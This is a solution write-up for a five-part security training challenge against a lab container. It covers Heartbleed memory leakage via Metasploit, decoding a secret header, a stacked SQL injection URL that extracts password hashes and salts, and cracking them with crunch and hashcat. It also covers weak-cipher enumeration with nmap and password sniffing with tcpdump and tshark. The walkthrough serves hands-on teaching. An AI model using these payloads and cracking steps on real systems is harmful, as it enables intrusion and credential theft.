### Warning: We strongly suggest you try to solve the challenge before checking the solution. 
### Happy hacking!

# Task 1

Task 1 is quite simple. First, launch Metasploit with the command:

```
msfconsole

IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v4.17.3-dev                          ]
+ -- --=[ 1795 exploits - 1019 auxiliary - 310 post       ]
+ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf >
```

Now, use one of the heartbleed module:

```
msf > use auxiliary/scanner/ssl/openssl_heartbleed
msf auxiliary(scanner/ssl/openssl_heartbleed) >
```

Set a few variables, like host, port and verbose mode:

```
msf auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 172.21.0.24
RHOSTS => 172.21.0.24
msf auxiliary(scanner/ssl/openssl_heartbleed) > set RPORT 8443
RPORT => 8443
msf auxiliary(scanner/ssl/openssl_heartbleed) > set VERBOSE true
VERBOSE => true
```

Exploit it!

```
msf auxiliary(scanner/ssl/openssl_heartbleed) > exploit

(...)
[*] 172.21.0.24:8443      - Printable info leaked:
......[.X..a.qV%.c..r...o.Bt............f.....".!.9.8.........5.............................3.2.....E.D...../...A..................................................................................................................................... repeated 16008 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................a@.....................A..~...ul^m..i=U_.s.E...o.........k./;.w...7..D..pP..oX......6...|.....OX......_...D...5.4...<6|.[.A..'.jE.Q.V..{.\.......Q....V%.E...l+.....M.s.`................5......-.Es.9...*.d.'8.5@H(....6.....Tex..?8j..q<qh..7..._....'...+0.U..g..;2..@a.+...4[T..N$n...)8NV.eBy(...r.......d..O:.c....V.Q......\UY_.....B[... b..4?...zn....)....$B...u.!.............('..t.N{fB....ez.....|....Z..E..,.wW...m@|pB.b[.]B.'...J..g.......0.0...U....0.0...*.H.................8.#^W....J..1q."r.......<.1\.......;.....t">{.>Y...Y..#j...x..x..vp...Z....O..T0.[...H...fJ.%w.Rt.@..$74.)......vWYN......UO.t...Yc...Y.......2...J\.$U..Q.....t.d......s(.W..=..th..!.n..`MP.>...>#aP..b..#......f......;DQ.....Q.h.=....Xa.....\.C..h....Z..................................................................................................................................... repeated 15069 times .....
(...)
```

The output above is the dump of the Docker container memory's content. 

Next, exit Metasploit and encode the name of the auxiliary module to get the Master Letter:

```
echo -n auxiliary/scanner/ssl/openssl_heartbleed | base64
YXV4aWxpYXJ5L3NjYW5uZXIvc3NsL29wZW5zc2xfaGVhcnRibGVlZA==
```

Master Letter: j

# Task 2

Retrive the header:

```
curl 172.21.0.24 -v

* Rebuilt URL to: 172.21.0.24/
*   Trying 172.21.0.24...
* TCP_NODELAY set
* Connected to 172.21.0.24 (172.21.0.24) port 80 (#0)
> GET / HTTP/1.1
> Host: 172.21.0.24
> User-Agent: curl/7.60.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Server: nginx/1.14.0
< Date: Fri, 05 Oct 2018 15:23:00 GMT
< Content-Type: application/octet-stream
< Content-Length: 2
< Connection: keep-alive
< X-Server-Secret: cGVuZXRyYXRpb250ZXN0aW5n
< Content-Type: text/plain
<
* Connection #0 to host 172.21.0.24 left intact
Ok
```

Decode the header:

```
echo -n cGVuZXRyYXRpb250ZXN0aW5n | base64 -d
penetrationtesting
```

To generate the master letter, hash the decoded string:

```
echo -n penetrationtesting | shasum -a 256
406024e3d6c129fd29b121d19c6ae383292318151b60e886fa51d7e131909c74  -
```

Master Letter is the 10th character of the string above: 6


# Task 3

The following curl request retrieves the password and salt:

```
curl "172.21.0.24:3000/user/1;SELECT%20password%20as%20username%20from%20USERS;SELECT%20salt%20as%20username%20from%20USERS"
```

Then, generate a wordlist:

```
crunch 12 12 -t 406@@@@@@c74 -o wordlist.txt
```

Put the hash and salt in a file (note that ':' is the delimiter so hashcat knows what's the password and what's the salt):
 
```
echo -n 0c6c9a25e6660a7af99c4308a355df3709fbf7ec2294ada37d4a81459eb60b5c:PBQSVZ > hash.txt
```

The `:` delimiter is important as that's how hashcat knows what part of the string is the hash and what part is the salt. Once that's done, run hashcat:

```
hashcat -a 0 -m 1410 hash.txt wordlist.txt --force
```

After a few seconds or minutes (not taking into account the time it takes to build the Dictionary cache), the password is cracked:

```
0c6c9a25e6660a7af99c4308a355df3709fbf7ec2294ada37d4a81459eb60b5c:PBQSVZ:406dfevnuc74

Session..........: hashcat
Status...........: Cracked
Hash.Type........: sha256($pass.$salt)
Hash.Target......: 0c6c9a25e6660a7af99c4308a355df3709fbf7ec2294ada37d4...PBQSVZ
Time.Started.....: Fri Oct  5 16:01:58 2018 (1 min, 9 secs)
Time.Estimated...: Fri Oct  5 16:03:07 2018 (0 secs)
Guess.Base.......: File (wordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:   551.9 kH/s (3.26ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 38014976/308915776 (12.31%)
Rejected.........: 0/38014976 (0.00%)
Restore.Point....: 38012928/308915776 (12.31%)
Candidates.#1....: 406dfeudsc74 -> 406dfexelc74
HWMon.Dev.#1.....: N/A
```

Master Letter: e

# Task 4

First, add `dojo.slalomdev.io` to `/etc/hosts`:

```
sudo su
echo "" >> /etc/hosts
echo "172.21.0.24 dojo.slalomdev.io" >> /etc/hosts
exit
```

Run the following command:

```
nmap -sV --script ssl-enum-ciphers -p 443 dojo.slalomdev.io

Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-05 16:07 UTC
Nmap scan report for dojo.slalomdev.io (172.21.0.24)
Host is up (0.00063s latency).

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http nginx 1.14.0
|_http-server-header: nginx/1.14.0
| ssl-enum-ciphers:
|   TLSv1.0:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C
|     compressors:
|       NULL
|     cipher preference: indeterminate
|     cipher preference error: Too few ciphers supported
|     warnings:
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
|   TLSv1.1:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C
|     compressors:
|       NULL
|     cipher preference: indeterminate
|     cipher preference error: Too few ciphers supported
|     warnings:
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
|   TLSv1.2:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C
|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A
|     compressors:
|       NULL
|     cipher preference: client
|     warnings:
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
|_  least strength: C

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds
```

The Cipher which is vulnerable to the Birthday Attack is 3DES. Master Letter: 3

## Error when running curl

If you run curl and get the following error:

```
$ curl https://dojo.slalomdev.io
curl: (60) SSL certificate problem: self signed certificate
More details here: https://curl.haxx.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the web page mentioned above.
```

It's because the SSL certificate that curl is getting is self-signed (not signed by a trusted Certificate Authority). To bypass that, use `-k` at the end of the command:

```
curl https://dojo.slalomdev.io -k
Ok
```

# Task 5

The solution to task 5 is quite simple. First, you need to capture a few seconds of traffic going through the eth0 interface:

```
sudo tcpdump -i eth0 -w eth0.pcap
```

After a few seconds capturing the traffic, run tshark to analyze the traffic:

```
tshark -r eth0.pcap -Y http -x
```

The command above will output something like this:

```
0000  12 f3 0f 5d f5 f0 12 7b b4 bc 05 24 08 00 45 00   ...]...{...$..E.
0010  00 91 3b ff 40 00 40 06 a6 06 ac 15 00 1f ac 15   ..;.@.@.........
0020  00 18 8d 4e 0b b8 28 e2 e7 29 28 a3 cc 8e 80 18   ...N..(..)(.....
0030  00 e5 58 e5 00 00 01 01 08 0a b7 93 75 1b 00 2e   ..X.........u...
0040  e2 ce 47 45 54 20 2f 68 6e 6a 61 75 73 68 6e 73   ..GET /hnjaushns
0050  67 78 62 61 20 48 54 54 50 2f 31 2e 31 0d 0a 48   gxba HTTP/1.1..H
0060  6f 73 74 3a 20 31 37 32 2e 32 31 2e 30 2e 32 34   ost: 172.21.0.24
0070  3a 33 30 30 30 0d 0a 55 73 65 72 2d 41 67 65 6e   :3000..User-Agen
0080  74 3a 20 63 75 72 6c 2f 37 2e 36 30 2e 30 0d 0a   t: curl/7.60.0..
0090  41 63 63 65 70 74 3a 20 2a 2f 2a 0d 0a 0d 0a      Accept: */*....

0000  12 7b b4 bc 05 24 12 f3 0f 5d f5 f0 08 00 45 00   .{...$...]....E.
0010  01 20 2e 41 40 00 40 06 b3 35 ac 15 00 18 ac 15   . .A@.@..5......
0020  00 1f 0b b8 8d 4e 28 a3 cc 8e 28 e2 e7 86 80 18   .....N(...(.....
0030  00 d2 15 8a 00 00 01 01 08 0a 00 2e e2 cf b7 93   ................
0040  75 1b 48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f   u.HTTP/1.1 200 O
0050  4b 0d 0a 58 2d 50 6f 77 65 72 65 64 2d 42 79 3a   K..X-Powered-By:
0060  20 45 78 70 72 65 73 73 0d 0a 58 2d 50 61 73 73    Express..X-Pass
0070  77 6f 72 64 3a 20 54 48 49 53 49 53 54 48 45 50   word: THISISTHEP
0080  41 53 53 57 4f 52 44 0d 0a 43 6f 6e 74 65 6e 74   ASSWORD..Content
0090  2d 54 79 70 65 3a 20 74 65 78 74 2f 68 74 6d 6c   -Type: text/html
00a0  3b 20 63 68 61 72 73 65 74 3d 75 74 66 2d 38 0d   ; charset=utf-8.
00b0  0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68 3a   .Content-Length:
00c0  20 32 0d 0a 45 54 61 67 3a 20 57 2f 22 32 2d 73    2..ETag: W/"2-s
00d0  4b 6d 43 46 71 4d 6b 4a 72 6e 6d 61 6b 72 42 36   KmCFqMkJrnmakrB6
00e0  32 33 79 36 57 34 62 53 56 77 22 0d 0a 44 61 74   23y6W4bSVw"..Dat
00f0  65 3a 20 46 72 69 2c 20 30 35 20 4f 63 74 20 32   e: Fri, 05 Oct 2
0100  30 31 38 20 31 36 3a 31 33 3a 33 30 20 47 4d 54   018 16:13:30 GMT
0110  0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e 3a 20 6b 65   ..Connection: ke
0120  65 70 2d 61 6c 69 76 65 0d 0a 0d 0a 4f 6b         ep-alive....Ok
```

The first set of packets shows an HTTP GET request to 172.21.0.24:3000/hnjaushnsgxba. Now, the second set of packets shows the response. The password is right there together with the header `X-Password`.

Master Letter: T

# Issues?

Please report any issues with this tutorial by opening a Pull Request or an Issue on GitHub.